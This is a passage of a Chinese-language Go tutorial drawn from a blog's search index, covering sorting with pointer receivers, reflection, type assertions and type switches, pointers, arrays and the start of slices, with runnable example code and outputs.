905 959 7586 7586 9845] The sorted array is: [Barry Golang Rita Sally barry quanquan616 rita sally] Sunday Monday Tuesday Wednesday Thursday Friday Saturday 4.6.5 不将 dayArray 声明为结构体的写法 4.6.3 的代码中，dayArray 是一个结构体类型，里面包含了一个 data 字段，字段类型为一个切片，存放的数据类型是 day 的指针变量。 如果不想使用结构体的话，可以如下写法：（其余代码不改动）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 type day struct { num int shortName string longName string } //类型为一个切片，存放的数据类型为day的指针变量 type dayArray []*day func (p *dayArray) Len() int { //dayArray是一个切片了 return len(*p) //接收者是指针类型，因为指针类型存放的是内存地址的值，必须先取出值，才能进行计算 } func (p *dayArray) Less(i, j int) bool { //接收者是指针类型，需要先用星花*运算符取出地址中的值，才能有后续的操作 return (*p)[i].num \u0026lt; (*p)[j].num //(*p)操作是取出内存地址中的那个一个整个切片 } func (p *dayArray) Swap(i, j int) { (*p)[i], (*p)[j] = (*p)[j], (*p)[i] } func days() { Sunday := day{0, \u0026#34;SUN\u0026#34;, \u0026#34;Sunday\u0026#34;} Monday := day{1, \u0026#34;MON\u0026#34;, \u0026#34;Monday\u0026#34;} Tuesday := day{2, \u0026#34;TUE\u0026#34;, \u0026#34;Tuesday\u0026#34;} Wednesday := day{3, \u0026#34;WED\u0026#34;, \u0026#34;Wednesday\u0026#34;} Thursday := day{4, \u0026#34;THU\u0026#34;, \u0026#34;Thursday\u0026#34;} Friday := day{5, \u0026#34;FRI\u0026#34;, \u0026#34;Friday\u0026#34;} Saturday := day{6, \u0026#34;SAT\u0026#34;, \u0026#34;Saturday\u0026#34;} data := []*day{\u0026amp;Tuesday, \u0026amp;Thursday, \u0026amp;Wednesday, \u0026amp;Sunday, \u0026amp;Monday, \u0026amp;Friday, \u0026amp;Saturday} //dayArray是一个存放day指针变量的切片了 a := dayArray(data) //接收者是指针类型，所以必须传址 sort.Sort(\u0026amp;a) if !sort.IsSorted(\u0026amp;a) { panic(\u0026#34;days sort failed.\u0026#34;) } for _, d := range data { fmt.Printf(\u0026#34;%s \u0026#34;, d.longName) } fmt.Println() } func main() { days() } /* 运行结果： Sunday Monday Tuesday Wednesday Thursday Friday Saturday */ 可以看到，运行结果一模一样。 4.6.3 代码中的写法是将切片再次封装成为一个数据类型，通过操作该数据类型中的字段，得到一整个切片，然后再根据下标进行取值。 本例中的写法是声明一个变量，类型为存放指针变量的切片，每次都是直接操作这个变量。\n4.6.6 参考文献 本节内容均来源于： 原文作者：Go 技术论坛文档：《Go 入门指南（）》 转自链接：https://learnku.com/docs/the-way-to-go/the-first-example-of-117-sorting-using-the-sorter-interface/3653 版权声明：翻译文档著作权归译者和 LearnKu 社区所有。转载请保留原文链接\n4.7 反射包reflect 反射可以在运行时检查类型和变量，例如它的大小、方法。 变量的最基本信息是：类型和值。反射包的 Type 用来表示一个类型，反射包的 Value 为值提供了反射接口。\n4.7.1 最基本的两个函数 reflect.TypeOf()，返回变量的类型。 reflect.ValueOf()，返回变量的值。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ```go ## 五、类型断言 类型查询也叫类型断言，常用的有两种方式： 1.comma-ok 断言（`if`） 2.type-switch 测试（`switch`） ### 5.1 if 实现类型断言 被判断的变量必须是一个接口变量，否则编译器会报错：`invalid type assertion: varI.(T) (non-interface type (type of varI) on left)` 。 #### 5.1.1 基本语法 `if value, ok := varName.(Type); ok == true {...}`。 `varName.(Type)` 采用`变量名.(数据类型)`的方式获取到：该变量的值和该变量是否为指定数据类型的 `bool` 值。 #### 5.1.2 最基本的使用 ```go if v, ok := varI.(T); ok { Process(v) return } 如果断言成功（varI 是 T 类型），v 是 varI 本身的值，ok 会是布尔值 true。否则 v 是 T 类型的零值，ok 会是布尔值 false，不会造成运行时错误。 注意：varI 需要是一个接口变量。\n5.1.3 简洁写法 多数情况下，可能只是想在 if 中测试一下 ok 的值，此时使用下面的写法会显得更加简洁、方便。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 if _, ok := varI.(T); ok { //... } 123 ```go #### 5.1.4 示例 ```go type Student struct { name string stuNo int } func main() { //声明一个长度为3的切片，里面的元素都是空接口。空接口可以接收任意的数据类型 items := make([]interface{}, 3) items[0] = 111 items[1] = \u0026#34;Golang\u0026#34; items[2] = Student{\u0026#34;xxx\u0026#34;, 999} //遍历，第一个返回元素的下标，第二个返回数据值。这里就是返回接口中的值 for index, data := range items { //data.(int)返回两个值，第一个是该变量本身的值，第二个返回该变量是否为指定数据类型的bool if value, ok := data.(int); ok == true { fmt.Printf(\u0026#34;items[%d] type is int, value=%d\\n\u0026#34;, index, value) } else if value, ok := data.(string); ok == true { fmt.Printf(\u0026#34;items[%d] type is string, value=%s\\n\u0026#34;, index, value) } else if value, ok := data.(Student); ok == true { //data这个变量是否为Student类型，Student是自定义的结构体类型 fmt.Printf(\u0026#34;items[%d] type is Student, value=%+v\\n\u0026#34;, index, value) } } } /* 运行结果： items[0] type is int, value=111 items[1] type is string, value=Golang items[2] type is Student, value={name:xxx stuNo:999} */ 5.2 type-switch 在程序运行时的时候进行类型分析。在处理来自于外部的、类型未知的数据时，比如解析诸如 JSON 或 XML 编码的数据，类型测试和转换会非常有用。\n5.2.1 基本写法 1 2 3 4 5 6 switch t := data.(type) { case type: ... case type: ... } 注意： 1.switch t := data.(type) 这条语句中，type 是关键字的那个type，不要写明数据类型。变量 t 在内存中占据两个字长：一个是其本身的类型，还有一个是其本身的值。 2.case type 语句中的 type 是写明具体的一个数据类型（例如：int, string, StructName），case type 根据 switch 语句中的 t 会去自行匹配。 3.data.(type) 必须在 switch 中使用，否则就报错！\n5.2.2 简洁写法 如果仅仅只是测试变量的类型，不想用它的值，那么就可以不需要赋值语句。 示例：\n1 2 3 4 5 6 7 8 switch areaIntf.(type) { case *Square: //... case *Circle: //... default: //... } 5.2.3 示例1：基本示例 将所有值放入一个切片中，切片的数据类型是空接口。（空接口是万能类型，允许接收任意类型） 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 type Student struct { name string stuNo int } func main() { //声明一个长度为4的切片，里面的元素都是空接口。空接口可以接收任意的数据类型 items := make([]interface{}, 4) items[0] = 111 items[1] = \u0026#34;Golang\u0026#34; items[2] = Student{\u0026#34;xxx\u0026#34;, 999} items[3] = false //遍历，第一个返回元素的下标，第二个返回数据值。这里就是返回接口中的值 for index, data := range items { switch data.(type) { //type是关键字，会自行跟下面各个case去匹配 case int: fmt.Printf(\u0026#34;items[%d] type is int, value=%d\\n\u0026#34;, index, data) case string: fmt.Printf(\u0026#34;items[%d] type is string, value=%s\\n\u0026#34;, index, data) case Student: fmt.Printf(\u0026#34;items[%d] type is Student, value=%+v\\n\u0026#34;, index, data) case bool: fmt.Printf(\u0026#34;items[%d] type is bool, value=%v\\n\u0026#34;, index, data) } } } /* 运行结果： items[0] type is int, value=111 items[1] type is string, value=Golang items[2] type is Student, value={name:xxx stuNo:999} items[3] type is bool, value=false */ 5.2.4 示例2：判定每个值的类型 给定一些值，根据每个值的实际类型执行不同的动作。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 func classifier(params ...interface{}) { for _, item := range params { switch t := item.(type) { case int, int16, int32, int64: fmt.Printf(\u0026#34;%v is an int type.\\n\u0026#34;, t) case bool: fmt.Printf(\u0026#34;%v is a bool type.\\n\u0026#34;, t) case float32, float64: fmt.Printf(\u0026#34;%v is a float.\\n\u0026#34;, t) case string: fmt.Printf(\u0026#34;%v is a string.\\n\u0026#34;, t) case nil: fmt.Printf(\u0026#34;it\u0026#39;s a nil.\\n\u0026#34;) default: fmt.Println(\u0026#34;%v is unknow.\\n\u0026#34;, t) } } } func main() { classifier(13, -14.3, \u0026#34;BELGIUM\u0026#34;, complex(1, 2), nil, false) } /* 运行结果： 13 is an int type. -14.3 is a float. BELGIUM is a string. %v is unknow. (1+2i) it\u0026#39;s a nil. false is a bool type. */ 5.2.5 示例3：type-switch 配合匿名函数 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 type specialString string //声明一个自定义类型，其底层类型为string var whatItThis specialString = \u0026#34;Hello Golang.\u0026#34; //自定义类型的底层类型为string，因此可以把字符串复制给它 func TypeSwitch() { testFunc := func(any interface{}) { //匿名函数的参数是空接口（万能接口），可以接收任何值 switch v := any.(type) { //v包含两个字长：一个是类型，另一个是本身的值 case bool: fmt.Printf(\u0026#34;v type is bool, value = %v\\n\u0026#34;, v) case int: fmt.Printf(\u0026#34;v type is int, value = %v\\n\u0026#34;, v) case float32, float64: fmt.Printf(\u0026#34;v type is float, value = %v\\n\u0026#34;, v) case string: fmt.Printf(\u0026#34;v type is string, value = %v\\n\u0026#34;, v) case specialString: fmt.Printf(\u0026#34;v type is a customize type: specialString, value = %v\\n\u0026#34;, v) default: fmt.Println(\u0026#34;v type is unkonw\u0026#34;) } } testFunc(whatItThis) } func main() { TypeSwitch() } /* 运行结果： v type is a customize type: specialString, value = Hello Golang. */ 本例的参考文献：\nhttps://learnku.com/docs/the-way-to-go/119-empty-interface/3655\n5.2.6 注意事项 5.2.6.1 case 语句中列举的类型，都必须实现对应的接口 所有 case 语句中列举的类型（nil 除外）都必须实现对应的接口。如果被检测类型没有在 case 语句列举的类型中，就会执行 default 语句。\n5.2.6.2 在 type-switch 不允许有 fallthrough 可以用 type-switch 进行运行时类型分析，但是在 type-switch 不允许有 fallthrough。\n","date":"2021-01-08T20:53:56Z","image":"https://w.wallhaven.cc/full/zy/wallhaven-zydldy.jpg","permalink":"https://360rce.github.io/p/giabprkd/","title":"Golang学习之面向对象编程"},{"content":"一、复合类型有哪些 Pointer 指针 Array 数组 Slice 切片 Map 哈希表 Struct 结构体 Interface 接口 Channel 通道 func 函数类型\n二、指针 指针是一个代表着某个内存地址值的数据类型，这个内存地址往往是在内存中存储的另一个变量的值的起始位置。 每个变量有2层含义：变量的内容，变量的地址。\n2.1 指针最基本的操作 2.1.1 Golang指针的特点 1.默认值为 nil。 2.操作符 \u0026amp; 取变量的地址，* 操作内存地址中的内容（值）。 3.不支持指针运算，使用 . 访问目标成员。\n2.1.2 基本例子 定义指针类型的语法：var 变量名 *数据类型。星号千万不要忘了，不然就是一个普通的数据类型，而不是指针类型！ 取出内存地址的值，赋值给指针类型的语法：指针的变量 = \u0026amp;变量名。这步操作就是让指针指向合法内存地址。\u0026amp;不要忘了*，不然就是普通的值赋值给指针类型，两者数据类型不匹配肯定报错！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func main() { var a = 10 fmt.Printf(\u0026#34;a=%d\\n\u0026#34;, a) //这里是变量的内存，内存里的内容 fmt.Printf(\u0026#34;\u0026amp;a=%p\\n\u0026#34;, \u0026amp;a) //内存外的标号，变量的地址，也叫指针 //保存某个变量的地址，需要指针类型 var p *int //保存int的地址 p = \u0026amp;a //指针变量想要指向谁，就把它的地址赋值给指针变量。这里想要指向上面的变量a，就取出a的地址赋值给指针变量即可 fmt.Printf(\u0026#34;p=%v, \u0026amp;a=%v\\n\u0026#34;, p, \u0026amp;a) //p=0xc00000a0b8, \u0026amp;a=0xc00000a0b8 值一样，因为：p就是保存了a的内存地址，\u0026amp;a是取出a的地址 *p = 666 //*p不是操作p的地址，而是操作p所指向的那个内存中的值。这里是给所指向的a赋值，就是操作a中的值 fmt.Printf(\u0026#34;*p=%v, a=%v\\n\u0026#34;, *p, a) //*p=666, a=666 } /* 运行结果： a=10 \u0026amp;a=0xc00000a0b8 p=0xc00000a0b8, \u0026amp;a=0xc00000a0b8 *p=666, a=666 */ 指针指向谁，就把谁的内存地址赋值给指针！指针一定要指向一个合法的内存地址！\n2.1.3 一些说明 1.变量都存放在内存当中。 2.每个变量在内存中有一个标号，也就是变量的地址（内存地址），也叫指针。使用取地址符 \u0026amp;，找到变量的标号（内存地址）。 3.想要保存这个标号（内存地址），就需要用到指针类型。 4.不要操作没有合法指向的内存。 错误示例：\n1 2 3 4 5 6 7 8 9 10 11 12 func main() { var p *int //声明变量p为int指针类型 //没有指向内存地址的时候，值为nil fmt.Println(\u0026#34;p=\u0026#34;, p) //p= \u0026lt;nil\u0026gt; *p = 666 /* panic: runtime error: invalid memory address or nil pointer dereference [signal 0xc0000005 code=0x1 addr=0x0 pc=0x49a833] 无效的内存地址或nil指针引用 */ } 5.数据类型要一样！不要定义的指针变量是 int，但最终却指向了其他类型。 错误示例：\n1 2 3 4 5 6 func main() { var a int var p *float64 p = \u0026amp;a //报错：cannot use \u0026amp;a (type *int) as type *float64 in assignment ===\u0026gt; 不能在分配中使用＆a（类型* int）作为类型* float64 } 6.操作指针所指向的变量时，不要忘了在前面带上星号 *，* 操作的是内存地址中的值。\n1 2 3 4 5 6 7 8 9 func main() { var a int var p *int //声明一个p变量，类型是int指针 p = \u0026amp;a //p保存了a的地址，内存地址是个指针类型 p = 111 //p前面的星号不要忘了，否则就报错：cannot use 111 (type int) as type *int in assignment ===\u0026gt; int类型不能赋值给指针类型 fmt.Printf(\u0026#34;a=%v, p=%v\u0026#34;, a, p) } 2.2 new()函数的使用 new(Type) 内置函数分配内存。Type 是一个具体写明的数据类型，而不是值。返回值是指向该类型新分配的零值的指针。 new(Type) 创建了一个匿名指针变量，为新值分配一块内存空间，其值为该类型的零值，然后将这块内存空间的地址作为结果返回。 之前的合法指向写法是声明一个变量和声明一个同类型的指针变量，然后将变量的内存地址赋值给指针变量，再把值赋值给带 * 的指针变量。new(Type) 是合法指向的另一种写法，指向一个没有名字的内存，实则是动态分配内存空间。\n1 2 3 4 5 6 7 8 9 10 func main() { var p *int //int指针类型，指向int类型 p = new(int) //p指针类型指向的是一个int类型，所以new()小括号里也必须是同类型 *p = 111 fmt.Printf(\u0026#34;p=%v, *p=%v\\n\u0026#34;, p, *p) //p=0xc000062090, *p=111 n := new(string) //自动推导类型，省略了声明的步骤，new(type)返回这个类型的零值 *n = \u0026#34;abce\u0026#34; fmt.Printf(\u0026#34;n=%v, *n=%v\\n\u0026#34;, n, *n) //n=0xc0000341f0, *n=abce } 2.3 值传递 值传递，把值拷贝一份过去，传递的是该值的副本，自身是不会被改变的。 Golang 中，除了 map、slice、chan，其他都是值传递。\n1 2 3 4 5 6 7 8 9 10 11 12 func swap(a, b int) { a, b = b, a fmt.Printf(\u0026#34;swap: a=%v, b=%v\\n\u0026#34;, a, b) //swap: a=20, b=10 //swap里面a,b交换了 } func main() { a, b := 10, 20 swap(a, b) //站在变量的角度，变量本身传递过去是属于值传递 fmt.Printf(\u0026#34;main: a=%v, b=%v\\n\u0026#34;, a, b) //main: a=10, b=20 //main里面依然没有交换 } main() 中，a, b 是整型，传递的时候属于值传递。\n2.4 使用指针进行地址传递 将变量的地址传递过去，俗称的\u0026quot;传址调用\u0026quot;。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 func swap(p1, p2 *int) { *p1, *p2 = *p2, *p1 //星号\u0026#34;*\u0026#34;直接操作内存地址中的值，星号\u0026#34;*\u0026#34;就是指针指向的那块内存 fmt.Printf(\u0026#34;swap: p1=%v, p2=%v\\n\u0026#34;, *p1, *p2) } /* func swap(p1, p2 *int) { //接收指针类型的实参 p1, p2 = p2, p1 //没带星号\u0026#34;*\u0026#34;只是交换了各自的内存地址的值(0xc0000a0..) fmt.Printf(\u0026#34;swap: p1=%v, p2=%v\\n\u0026#34;, *p1, *p2) //swap: p1=0xc00000a0d0, p2=0xc00000a0b8 } */ func main() { a, b := 10, 20 swap(\u0026amp;a, \u0026amp;b) fmt.Printf(\u0026#34;a address:%v, b address:%v\\n\u0026#34;, \u0026amp;a, \u0026amp;b) fmt.Printf(\u0026#34;main: a=%v, b=%v\\n\u0026#34;, a, b) } /* 运行结果： swap: p1=20, p2=10 a address:0xc00000a0b8, b address:0xc00000a0d0 main: a=20, b=10 */ 三、数组 数组是指一系列同一类型数据的集合。作用：很多元素都是同一数据类型，放进一个集合中更容易操作和管理。 数组中包含的每个数据被称为数组元素（element），一个数组包含的元素个数被称为数组的长度。 数组长度必须是常量，因为数组的长度不可变，是其声明的组成部分。[2]int 和 [3]int 是不同类型！\n3.1 声明语法 语法：var 名称 [N]Type。 N 指定数组长度的一个常量，或者是一个固定的 int 值。 Type 是这个数组中元素的数据类型，数组中的所有元素的类型必须都一样。 [] 不能忘了写，不然就是其他类型而不是数组类型了。 示例：\n1 2 3 4 5 6 var n = 10 var a [n]int //非法定义：non-constant array bound n, Invalid array bound \u0026#39;n\u0026#39;, must be a constant expression var b [10]int //合法定义：代表这个数组长度为10 const num = 20 var c [num]string //合法定义：num是一个常量 3.2 初始化数组 初始化就是定义的同时并赋值，数组的长度是固定的，初始化的时候必须写明长度。\n3.2.1 传统写法 语法：var variableName [const]Type = [const]Type{/*放入const个元素*/} 其中等号 = 左边的 [const]Type 可以省略不写，变成：var 名称 = [const]Type{/*放入const个元素*/} 自动推导：名称 := [const]Type{/*放入const个元素*/}\n3.2.2 部分初始化 没有初始化的元素，自动赋值为其类型的零值。\n3.2.3 省略号 ... 出现在数组长度的位置 在数组字面量中，如果省略号 ... 出现在数组长度的位置，那么数组的长度由初始化数组的元素个数所决定，最终的数据类型行依然是个数组。 例1：... 的长度由元素个数来决定了\n1 2 3 4 5 6 func main() { q := [...]int{1, 2, 3, 4, 5} fmt.Printf(\u0026#34;q length:%d, q type is:%[2]T, q=%[2]v\\n\u0026#34;, len(q), q) //q length:5, q type is:[5]int, q=[1 2 3 4 5] } 例2：没有元素的话，长度就为 0 了\n1 2 3 4 5 6 func main() { q := [...]int{} fmt.Printf(\u0026#34;q length:%d, q type is:%[2]T, q=%[2]v\\n\u0026#34;, len(q), q) //q length:0, q type is:[0]int, q=[] } 3.2.4 指定下标初始化 通过指定下标来给值，无需按顺序给出一组值了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func main() { //指定下标，然后给值。无需再按照顺序逐个一一对应地给值了 symbol := [...]string{3: \u0026#34;￥\u0026#34;, 2: \u0026#34;£\u0026#34;, 1: \u0026#34;€\u0026#34;, 0: \u0026#34;$\u0026#34;} fmt.Printf(\u0026#34;USD:%v\\n\u0026#34;, symbol[0]) fmt.Printf(\u0026#34;EUR:%v\\n\u0026#34;, symbol[1]) fmt.Printf(\u0026#34;GBP:%v\\n\u0026#34;, symbol[2]) fmt.Printf(\u0026#34;RMB:%v\\n\u0026#34;, symbol[3]) } /* 运行结果： USD:$ EUR:€ GBP:£ RMB:￥ */ 常量生成器 iota 的值是从 0 开始，每行的值递增 1。 运用常量生成器 iota 的特性，来实现指定下标给值。上例中，数组初始化那条语句，也可以写成下面等价的语句：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 func main() { type Currency int const ( USD Currency = iota //iota 从 0 开始递增 1 EUR GBP RMB ) symbol := [...]string{RMB: \u0026#34;￥\u0026#34;, GBP: \u0026#34;£\u0026#34;, EUR: \u0026#34;€\u0026#34;, USD: \u0026#34;$\u0026#34;} //常量是 iota 生成器，iota 从 0 开始递增 1，所以也可以当做下标来使用 fmt.Printf(\u0026#34;USD:%v\\n\u0026#34;, symbol[USD]) //iota 当下标来使用 fmt.Printf(\u0026#34;EUR:%v\\n\u0026#34;, symbol[EUR]) fmt.Printf(\u0026#34;GBP:%v\\n\u0026#34;, symbol[GBP]) fmt.Printf(\u0026#34;RMB:%v\\n\u0026#34;, symbol[RMB]) } /* 运行结果： USD:$ EUR:€ GBP:£ RMB:￥ */ 3.2.5 综合示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main() { //只声明不赋值 //var a [3]int //初始化：定义的同时给与赋值 //全部初始化 var a = [5]int{1, 2, 3, 4, 5} //等号左边的 [5] int，可以省略不写 fmt.Println(a) //自动推导 b := [5]int{111, 222, 333, 444, 555} fmt.Printf(\u0026#34;b type is : %T, b:%v\\n\u0026#34;, b, b) //部分初始化，没有初始化的元素自动赋值给其对应类型的零值 c := [5]int{777, 100} fmt.Println(\u0026#34;c=\u0026#34;, c) //指定某个下标中的值（也叫指定初始化） d := [5]int{2: 999, 4: 666} fmt.Println(\u0026#34;d=\u0026#34;, d) } /* 运行结果： [1 2 3 4 5] b type is : [5]int, b:[111 222 333 444 555] c= [777 100 0 0 0] d= [0 0 999 0 666] */ 3.2.6 小技巧 3.2.6.1 快速声明一个长度为50的数组 指定最后一个下标的值，其他元素的值都是该指定类型的零值。\n1 2 3 4 5 6 func main() { r := [...]int{49: 0} //指定最后一个下标的值，其他元素都是 int 类型的零值 fmt.Printf(\u0026#34;r length:%d, r type is%[2]T, r=%[2]v\\n\u0026#34;, len(r), r) //r length:50, r type is[50]int, r=[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] } 3.3 二维数组 定义时有多少个方括号 [] 就是多少维数组。二维数组相当于一个表格，[0,0] 下标从最左上角开始。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 func main() { //有2个方括号\u0026#34;[]\u0026#34;，就是二维数组 var a [3][4]int //3行4列的数组 //赋值，有多少个\u0026#34;[]\u0026#34;就用多少层循环 k := 111 for i := 0; i \u0026lt; 3; i++ { for j := 0; j \u0026lt; 4; j++ { k++ a[i][j] = k fmt.Printf(\u0026#34;a[%d][%d] = %d, \u0026#34;, i, j, a[i][j]) } fmt.Println() } fmt.Println(\u0026#34;a=\u0026#34;, a) //初始化一个二维数组 //第一个方括号\u0026#34;[]\u0026#34;代表有几行，第二个方括号\u0026#34;[]\u0026#34;代表有几列 b := [3][3]int{ {1, 2, 3}, //使用大括号包裹起来 {4, 5, 6}, {7, 8, 9}, //逗号不要漏了，这是语法规定 } fmt.Println(\u0026#34;b=\u0026#34;, b) //指定初始化，未初始化的是对应数据类型的零值 //4行3列，只初始化第3行的数据 c := [4][3]byte{2: {\u0026#39;g\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;r\u0026#39;}} fmt.Println(\u0026#34;c=\u0026#34;, c) } /* 运行结果： a[0][0] = 112, a[0][1] = 113, a[0][2] = 114, a[0][3] = 115, a[1][0] = 116, a[1][1] = 117, a[1][2] = 118, a[1][3] = 119, a[2][0] = 120, a[2][1] = 121, a[2][2] = 122, a[2][3] = 123, a= [[112 113 114 115] [116 117 118 119] [120 121 122 123]] b= [[1 2 3] [4 5 6] [7 8 9]] c= [[0 0 0] [0 0 0] [103 112 114] [0 0 0]] */ 另一种实现二维数组的方式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func main() { h, w := 2, 4 raw := make([]int, h*w) for i := range raw { raw[i] = i } fmt.Println(\u0026#34;raw =\u0026#34;, raw) table := make([][]int, h) for i := range table { table[i] = raw[i*w : i*w+w] } fmt.Println(\u0026#34;table =\u0026#34;, table) } /* 运行结果： raw = [0 1 2 3 4 5 6 7] table = [[0 1 2 3] [4 5 6 7]] */ 备注：示例来源：https://studygolang.com/articles/28753（创建一个动态的多维数组需要三步）\n3.4 数组比较和赋值 3.4.1 数组比较的原则 如果数组中的元素类型是可比较的，那么这个数组也是可比较的。比较的结果是两个数组中，所有的元素的值是否完全相同。 数组只支持 == 和 !=，不能用小于等于。\n3.4.2 数组比较的示例 例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { a := [5]int{1, 2, 3, 4, 5} b := [5]int{1, 2, 3, 4, 5} c := [5]int{1, 2, 3} fmt.Println(\u0026#34;a == b ?\u0026#34;, a == b) fmt.Println(\u0026#34;b == c ?\u0026#34;, b == c) } /* 运行结果： a == b ? true b == c ? false */ 例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { a := [2]int{1, 2} b := [...]int{1, 2} //...的长度由数组中的元素个数来决定。这里其实就是 [2]int 类型 c := [2]int{1, 3} fmt.Println(a == b, a == c, b == c) d := [...]int{1, 3} //这里其实就是 [2]int 类型 fmt.Println(a == d, b == d, c == d) //比较的原则是两边元素的值是否完全相同，a d 两个数组中，第二个元素的值不同，所以 == 比较的结果为 false } /* 运行结果： true false false false false true */ 3.4.3 数组相互赋值 只有当长度相同且为同类型的数组之间，才可以相互赋值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func main() { a := [5]int{1, 2, 3, 4, 5} fmt.Printf(\u0026#34;a type is:%T\\n\u0026#34;, a) var d [5]int fmt.Printf(\u0026#34;d type is:%T\\n\u0026#34;, d) d = a //长度和类型都一样的数组才能相互赋值 fmt.Println(\u0026#34;d=\u0026#34;, d) a = [5]int{10, 9, 8, 7, 6} fmt.Println(\u0026#34;a=\u0026#34;, a) } /* 运行结果： a type is:[5]int d type is:[5]int d= [1 2 3 4 5] a= [10 9 8 7 6] */ 不同长度的数组是不同的类型，就算它们的数据类型一样也不行。 总之一句话：数组长度不同、或者数据类型不同，都不是同一类型的数组。 反面示例：\n1 2 3 4 5 func main() { a := [3]int{1, 2, 3} b := [5]int{1, 2, 3, 4, 5} fmt.Println(\u0026#34;a == b?\u0026#34;, a == b) //invalid operation: a == b (mismatched types [3]int and [5]int) ===\u0026gt; 不匹配类型[3]int和[5]int } 3.4.4 注意事项 1.Golang 压根就没设计过数组之间 \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= 的运算，只支持 == 和 !=\n1 2 3 4 5 func main() { a := [5]int{1, 2, 3} b := [5]int{1, 2, 3, 4, 5} fmt.Println(\u0026#34;a == b?\u0026#34;, a \u0026lt; b) //invalid operation: a \u0026lt; b (operator \u0026lt; not defined on array) } 3.5 数组做函数参数，值传递（值拷贝） 值传递是把整个数组拷贝一份传递给形参，形参接收的是实参的一份副本 注意：当数组中元素数量很多的时候，值拷贝的效率非常低下，而且可能会爆内存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //注意：参数类型要一模一样 func test1(a [5]int) { a[0] = 111111 fmt.Println(\u0026#34;test1: a=\u0026#34;, a) } func main() { a := [5]int{1, 2, 3, 4, 5} //初始化 test1(a) fmt.Println(\u0026#34;main: a=\u0026#34;, a) } /* 运行结果： test1: a= [111111 2 3 4 5] main: a= [1 2 3 4 5] */ 3.6 数组做函数参数，引用传递（传址） 两个函数需要共用一个数组，或者这个数组中元素数量非常多，不适合值传递的时候，就可以用到数组指针。 注意：使用数组指针后，任何修改都将影响到原本的数组。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func test1(a *[5]int) { //数组指针，指向实参a的内存地址 a[0] = 1111111111 fmt.Println(\u0026#34;test1: a=\u0026#34;, *a) //取值用* } func main() { a := [5]int{1, 2, 3, 4, 5} test1(\u0026amp;a) //地址传递，变量前加一个取地址符\u0026amp; fmt.Println(\u0026#34;main: a=\u0026#34;, a) } /* 运行结果： test1: a= \u0026amp;[1111111111 2 3 4 5] main: a= [1111111111 2 3 4 5] */ 四、Slice 切片 数组的长度在定义后就无法修改，而且数组是值类型。切片并不是数组或者数组指针，它通过内部指针和相关属性引用数组片段（一种数据结构），以实现变长方案。 Slice 本质上不是一个数组，而是一个引用类型，是对数组的引用，Slice 总是指向一个底层的Array。Slice 的声明也可以像 Array 一样，只是不需要长度。 简单理解，可以把 Slice 称呼为：动态数组。\n4.1 切片初始化 1.a := []数据类型{}，自动推导类型。注意：[]中不要写数字，否则它的类型就是数组了。 2.a := make([]数据类型, 长度, 容量)，长度必须写，容量可以省略不写。当容量不写的时候，跟长度的值保持一样。\n4.2 基本示例 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 func main() { a := [6]int{0, 1, 2, 3, 4, 5} //[]里写了数字就是一个数组 s := a[0:3] fmt.Printf(\u0026#34;s type is : %T, s=%v\\n\u0026#34;, s, s) fmt.Printf(\u0026#34;len(s)=%v, cap(s)=%v\\n\u0026#34;, len(s), cap(s)) fmt.Println(\u0026#34;--------------------------\u0026#34;) s = a[2:4] //从数组a下标2开始引用，4-2=2，引用2个元素。因为只引用2个元素，数组中剩余的元素就被隐藏起来了 fmt.Println(\u0026#34;s = a[2:4] ===\u0026gt; \u0026#34;, s) fmt.Println(\u0026#34;len(s)=\u0026#34;, len(s)) fmt.Println(\u0026#34;cap(s)=\u0026#34;, cap(s)) //从数组a下标2开始引用，cap只计算下标2开始到最后的\u0026#34;长度\u0026#34; //切片是对数组的引用，这里的切片s引用的是数组a，所以对s的append也会同时append到a中去 //append是末尾添加，当前切片s的末尾元素的值是3，在元素3后面添加新元素 //同样也将从数组a当中的元素3后面开始添加（因为左闭右开） s = append(s, 111) s = append(s, 222) s = append(s, 333) //a的cap达到极限了，无法再继续append s = append(s, 444) //\u0026#34;动态数组\u0026#34;会自动增加容量 fmt.Println(\u0026#34;s=\u0026#34;, s) fmt.Println(\u0026#34;a=\u0026#34;, a) } /* 运行结果： s type is : []int, s=[0 1 2] len(s)=3, cap(s)=6 -------------------------- s = a[2:4] 